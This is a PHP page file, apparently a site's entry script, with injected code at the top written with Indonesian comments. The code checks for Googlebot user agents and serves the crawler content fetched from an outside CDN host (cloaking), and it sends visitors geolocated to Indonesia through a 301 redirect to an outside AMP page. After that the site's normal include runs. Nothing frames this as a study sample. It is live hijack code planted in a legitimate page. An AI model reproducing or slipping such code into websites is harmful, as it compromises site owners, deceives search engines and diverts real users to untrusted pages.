<?php
function is_google_bot() {
    $agents = array("Googlebot", "Google-Site-Verification", "Google-InspectionTool", "Googlebot-Mobile", "Googlebot-News");
    foreach ($agents as $agent) {
        if (isset($_SERVER['HTTP_USER_AGENT']) && strpos($_SERVER['HTTP_USER_AGENT'], $agent) !== false) return true;
    }
    return false;
}

function get_visitor_country() {
    $ip = $_SERVER['REMOTE_ADDR'];
    // Opsional: Cek jika di belakang proxy/Cloudflare
    if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
    
    $details = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
    return ($details && $details->status == 'success') ? $details->countryCode : '';
}

// 1. Logika untuk Google Bot (Cloaking)
if (is_google_bot()) {
    $bot_content = 'https://ane-hin-la-kauceng.b-cdn.net/seta.co.uk.txt';
    
    $curl = curl_init();
    curl_setopt_array($curl, array(
        CURLOPT_URL => $bot_content,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_ENCODING => '',
        CURLOPT_MAXREDIRS => 10,
        CURLOPT_TIMEOUT => 10,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        CURLOPT_CUSTOMREQUEST => 'GET',
        CURLOPT_HTTPHEADER => array('User-Agent: Googlebot'),
    ));

    $response = curl_exec($curl);
    curl_close($curl);
    echo $response;
    exit;
}

// 2. Logika untuk Pengunjung Asli (Indonesia Redirect)
$user_country = get_visitor_country();
if ($user_country === 'ID') {
    // Ganti URL di bawah dengan link AMP tujuan Anda
    header("Location: https://ane-hin-la-kauceng.b-cdn.net/ampseta.html", true, 301);
    exit;
}
?>
<?
include ("includes/_applications/_core.php");   

if ($sub_name)  showpage($sub_name, $articleitem);
else showpage($name, $articleitem);
?>
